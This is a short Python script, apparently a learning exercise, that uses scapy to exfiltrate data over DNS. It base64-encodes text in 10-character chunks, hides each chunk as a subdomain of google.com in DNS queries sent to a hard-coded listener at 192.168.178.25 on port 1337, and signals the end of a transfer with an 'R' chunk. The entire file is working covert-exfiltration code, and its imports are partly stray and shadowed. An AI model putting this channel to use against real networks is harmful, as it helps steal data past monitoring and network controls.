from concurrent.futures import process
from tabnanny import verbose
from telnetlib import IP
from scapy.all import *
from base64 import b64encode


ip = "192.168.178.25"
domain = "google.com"

# Is based of the data that we receive in our response
def process(response):
    code = str(response[DNS].an.rdata)[-1]
    if int(code) == 1:
        print("Received successfully")
    elif int(code) == 2:
        print("Achnowledged end transmission")
    else:
        print("Transmission error")

# Exfiltration using a sub-domain to hold data
def DNSRequest(subdomain):
    global domain
    # Build the domain we're requesting
    d = bytes(subdomain + "." + domain,"utf-8")
    query = DNSQR(qname=d)
    mac = get_if_hwaddr(conf.iface) # Build hardware address because scapy have problem with localhost
    p = Ether(src=mac,dst=mac)/IP(dst=bytes(ip,"utf-8"))/UDP(dport=1337)/DNS(qd=query) # Build a packet
    result = srp1(p,verbose=False) # srp1 because we want to send this packet at layer 2,
    process(result)

    

# Breaking up the data that we're exfiltrating into multiple different chunks
# Each chunk is going to be 10 characters long and encoding the data as a subdomain in DNS request.
def sendData(data):
    for i in range(0,len(data),10):
        chunk = data[i:min(i+10,len(data))]
        print("Transmitting %s"%chunk)
        encoded = b64encode(bytes(chunk,"utf-8"))
        print(encoded)
        encoded = encoded.decode("utf-8").rstrip("=") # rstrip to remove the equal signs from the end of the data that we're encoded
        DNSRequest(encoded)


# if you're using DNS for exfiltrating a file, then you send a file
# then send a letter R, then send the next file to configure the bountries between packets

data = "This is the secret data"
sendData(data)
data = "R" # means that the current transmission is complete
sendData(data)
